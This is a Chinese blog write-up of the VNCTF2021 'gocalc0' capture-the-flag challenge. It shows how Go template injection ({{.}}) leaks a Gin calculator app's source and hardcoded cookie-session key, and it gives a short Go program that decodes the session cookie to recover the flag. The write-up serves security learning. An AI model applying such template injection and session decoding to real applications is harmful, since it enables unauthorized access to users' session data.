[VNCFT2021]gocalc0复现

[ H_00c8](https://www.jianshu.com/u/3cf70976a08b)关注赞赏支持

# [VNCFT2021]gocalc0复现

# [VNCFT2021]gocalc0复现

这道题当时出了非预期，session两次base64就能getflag，但是这道题本身的考点是Golang SSTI

正好复盘学习一下

打开题目能看到经典计算器

image.png

点开flag在这里发现只有短短一行提示

image.png

    
    
    flag is in your session
    

这里按照非预期接还是能够拿到flag

image.png

但是我们要看一下具体按照预期方法怎么能拿到flag

image.png

> <https://www.jianshu.com/p/e0ffb76ba7e9>

>
> **[【查看相关资料】](https://links.jianshu.com/go?to=https%3A%2F%2Fdocs.qq.com%2Fdoc%2FDVExrc2JqUU1DWWd5)**  
>  1、网络安全学习路线  
>  2、电子书籍（白帽子）  
>  3、安全大厂内部视频  
>  4、100份src文档  
>  5、常见安全面试题  
>  6、ctf大赛经典题目解析  
>  7、全套工具包  
>  8、应急响应笔记

这里我们通过{{.}}查看一下作用域

image.png

整理一下，就能够看到整个calc的源码

    
    
    package main
     
    import (
        _ "embed"
        "fmt"
        "os"
        "reflect"
        "strings"
        "text/template"
     
        "github.com/gin-contrib/sessions"
        "github.com/gin-contrib/sessions/cookie"
        "github.com/gin-gonic/gin"
        "github.com/maja42/goval"
    )
     
    var tpl string
     
    //go:embed main.go
    var source string
     
    type Eval struct {
        E string `json:"e" form:"e" binding:"required"`
    }
     
    func (e Eval) Result() (string, error) {
        eval := goval.NewEvaluator()
        result, err := eval.Evaluate(e.E, nil, nil)
        if err != nil {
            return "", err
        }
        t := reflect.ValueOf(result).Type().Kind()
     
        if t == reflect.Int {
            return fmt.Sprintf("%d", result.(int)), nil
        } else if t == reflect.String {
            return result.(string), nil
        } else {
            return "", fmt.Errorf("not valid type")
        }
    }
     
    func (e Eval) String() string {
        res, err := e.Result()
        if err != nil {
            fmt.Println(err)
            res = "invalid"
        }
        return fmt.Sprintf("%s = %s", e.E, res)
    }
     
    func render(c *gin.Context) {
        session := sessions.Default(c)
     
        var his string
     
        if session.Get("history") == nil {
            his = ""
        } else {
            his = session.Get("history").(string)
        }
     
        fmt.Println(strings.ReplaceAll(tpl, "{{result}}", his))
        t, err := template.New("index").Parse(strings.ReplaceAll(tpl, "{{result}}", his))
        if err != nil {
            fmt.Println(err)
            c.String(500, "internal error")
            return
        }
        if err := t.Execute(c.Writer, map[string]string{
            "s0uR3e": source,
        }); err != nil {
            fmt.Println(err)
        }
    }
    func main() {
        port := os.Getenv("PORT")
        if port == "" {
            port = "8080"
        }
        r := gin.Default()
        store := cookie.NewStore([]byte("woW_you-g0t_sourcE_co6e"))
        r.Use(sessions.Sessions("session", store))
        r.GET("/", func(c *gin.Context) {
            render(c)
        })
        r.GET("/flag", func(c *gin.Context) {
            session := sessions.Default(c)
            session.Set("FLAG", os.Getenv("FLAG"))
            session.Save()
            c.String(200, "flag is in your session")
        })
     
        r.POST("/", func(c *gin.Context) {
            session := sessions.Default(c)
     
            var his string
     
            if session.Get("history") == nil {
                his = ""
            } else {
                his = session.Get("history").(string)
            }
            eval := Eval{}
            if err := c.ShouldBind(&eval); err == nil {
                his = his + eval.String() + "<br/>"
            }
            session.Set("history", his)
            session.Save()
            render(c)
        })
        r.Run(fmt.Sprintf(":%s", port))
    }
    

这里有很多东西，我们可以进行一下删减整理（对我们getflag没什么用处），提取出我们想要的东西

    
    
    package main
     
    import (
        _ "embed"
        "github.com/gin-contrib/sessions"
        "github.com/gin-contrib/sessions/cookie"
        "github.com/gin-gonic/gin"
        "os"
    )
     
    func main() {
        port := os.Getenv("PORT")
        if port == "" {
            port = "8888" //这个port可以自己指定奥
        }
        r := gin.Default()
        store := cookie.NewStore([]byte("woW_you-g0t_sourcE_co6e"))
        r.Use(sessions.Sessions("session", store))
        r.GET("/flag", func(c *gin.Context) {
            session := sessions.Default(c)
            c.String(200, session.Get("FLAG").(string))
        })
        r.Run(":8888")
    }
    

注意下这里

    
    
    store := cookie.NewStore([]byte("woW_you-g0t_sourcE_co6e"))
    

这里是创建基于cookie的存储引擎，woW_you-g0t_sourcE_co6e参数是用于加密的密钥

然后是这里

    
    
    c.String(200, session.Get("FLAG").(string))
    

session.Get("FLAG")这里是gin框架中的读取session，而他指定了FLAG这个key（session是键值对格式数据，因此需要通过key查询数据），所以我们可以尝试本地起这个gin框架，修改一下代码，并且把题目中的session传入cookie，看看他最终会输出什么

exp：

    
    
    package main
    import (
        _ "embed"
        "fmt"
        "github.com/gin-contrib/sessions"
        "github.com/gin-contrib/sessions/cookie"
        "github.com/gin-gonic/gin"
        "os"
    )
    func main() {
        port := os.Getenv("PORT")
        if port == "" {
            port = "8888" //这个port可以自己指定奥
        }
        r := gin.Default()
        store := cookie.NewStore([]byte("woW_you-g0t_sourcE_co6e"))
        r.Use(sessions.Sessions("session", store))
        r.GET("/flag", func(c *gin.Context) {
            session := sessions.Default(c)
            b := session.Get("FLAG")
            fmt.Println(b)
        })
        r.Run(":8888")
    }
    

结果如下

image.png

成功解密出flag

但是这里有个问题

    
    
    c.String(200, session.Get("FLAG").(string))
    

笔者在写exp的时候，对String()产生了疑惑（我的Golang水平停留在Hello world水平），如果exp这样写他会直接输出在界面上

    
    
    r.GET("/flag", func(c *gin.Context) {
        session := sessions.Default(c)
        c.String(200, session.Get("FLAG").(string))
    })
    

出于好奇，我跟进了一下

image.png

这里给了注释，我蹩脚的翻译一下

    
    
    String()会把给定的字符串写入响应体中
    

跟进Render

image.png

    
    
    Render() 写入响应头并调用render。并且渲染出来
    

这里就明了了，shit我根本不用改代码啊！！！直接让他渲染出来就好了！！

so，我们验证一下

    
    
    package main
     
    import (
        _ "embed"
        "github.com/gin-contrib/sessions"
        "github.com/gin-contrib/sessions/cookie"
        "github.com/gin-gonic/gin"
        "os"
    )
     
    func main() {
        port := os.Getenv("PORT")
        if port == "" {
            port = "8888" //这个port可以自己指定奥
        }
        r := gin.Default()
        store := cookie.NewStore([]byte("woW_you-g0t_sourcE_co6e"))
        r.Use(sessions.Sessions("session", store))
        r.GET("/flag", func(c *gin.Context) {
            session := sessions.Default(c)
            c.String(200, session.Get("FLAG").(string))
            c.String(200, "\nThis is H3h3QAQ")
        })
        r.Run(":8888")
    }
    

结果如下

image.png

### 推荐阅读[更多精彩内容 __](https://www.jianshu.com/)

  * [CISCN-2019-web复现(完)](https://www.jianshu.com/p/ca36dfed3fdb)

原来国赛就是CISCN......buuoj上题目挺全的，干脆选一些比较有价值的题目复现下： Hack World...

[byc_404](https://www.jianshu.com/u/3a00738ba39e)阅读 2,828评论 0赞 3

  * [MixGo v1.1发布, Go 快速开发脚手架工具](https://www.jianshu.com/p/679e0114408a)

Mix Go 是一个基于 Go 进行快速开发的完整系统，类似前端的 Vue CLI，提供： 通过 mix-go/m...

[撸代码的乡下人](https://www.jianshu.com/u/55160f370bf1)阅读 438评论 0赞 4

  * [现在位置： 首页 > 独家 > 正文 XDCTF2014 Writeup之Web和Crack篇](https://www.jianshu.com/p/2dc590290d6e)

现在位置：首页>独家> 正文 XDCTF2014 Writeup之Web和Crack篇 2014 /10/7 11...

[tmdsb38](https://www.jianshu.com/u/f44cac946f18)阅读 988评论 0赞 0

  * [2020新春战疫公益CTF](https://www.jianshu.com/p/b0a130fe5c4d)

这次公益赛算是经过一个寒假的修炼后头一次大比赛了。可以发现自己确实对某些题目逐渐有些感觉。第一天错失弱智题，但是节...

[byc_404](https://www.jianshu.com/u/3a00738ba39e)阅读 1,976评论 3赞 3

  * [RCTF2020-Misc-writeup-全](https://www.jianshu.com/p/dd1a2f73d703)

博客原文 https://blog.jeffz.cn/2020/06/01/RCTF2020-Web-Misc/ ...

[JeffZF](https://www.jianshu.com/u/9d4f9600fba3)阅读 411评论 0赞 0

 